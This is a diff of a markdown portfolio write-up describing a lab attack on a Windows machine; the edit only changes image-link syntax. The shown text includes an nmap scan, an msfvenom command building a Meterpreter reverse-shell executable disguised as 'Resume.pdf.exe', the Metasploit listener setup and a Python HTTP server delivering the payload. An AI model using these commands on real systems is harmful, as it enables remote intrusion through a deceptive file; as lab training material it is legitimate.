@@ -24,13 +24,13 @@ Nmap Port Scan
 Objective: Identify open ports on the Windows target.
 Command: nmap -sS -T4 -Pn <target-ip>
 Result: Discovered open TCP port 3389 (RDP) indicating a potential remote access point.
-<a href="https://github.com/waqar172/Portfolio/blob/master/01.PNG?raw=true"></a>
+![image alt](https://github.com/waqar172/Portfolio/blob/master/01.PNG?raw=true)
 
 2. MSFvenom Payload Generation
 Objective: Create a malicious executable to simulate initial access.
 Command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe -o Resume.pdf.exe
 Output: Generated a reverse shell payload disguised as a PDF file.
-<a href="https://github.com/waqar172/Portfolio/blob/master/02.PNG?raw=true"></a>
+![image alt](https://github.com/waqar172/Portfolio/blob/master/02.PNG?raw=true)
 
 3. Metasploit Exploit Setup
 Objective: Configure the Metasploit listener to handle the reverse shell.
@@ -40,12 +40,12 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <kali-ip>
 set LPORT 4444
 run
-<a href="https://github.com/waqar172/Portfolio/blob/master/03.PNG?raw=true"></a>
+![image alt](https://github.com/waqar172/Portfolio/blob/master/03.PNG?raw=true)
 
 4. Python HTTP Server for Payload Delivery
 Objective: Serve the malicious file to the Windows victim machine over HTTP.
 Command: python3 -m http.server 9999
-<a href="https://github.com/waqar172/Portfolio/blob/master/04.PNG?raw=true"></a>
+![image alt](https://github.com/waqar172/Portfolio/blob/master/04.PNG?raw=true)
 
 5. HTTP Server Webpage Hosting the Payload
 Objective: Deliver the malicious executable (Resume.pdf.exe) to the target Windows machine. The file is hosted via a simple Python HTTP server on port 9999.
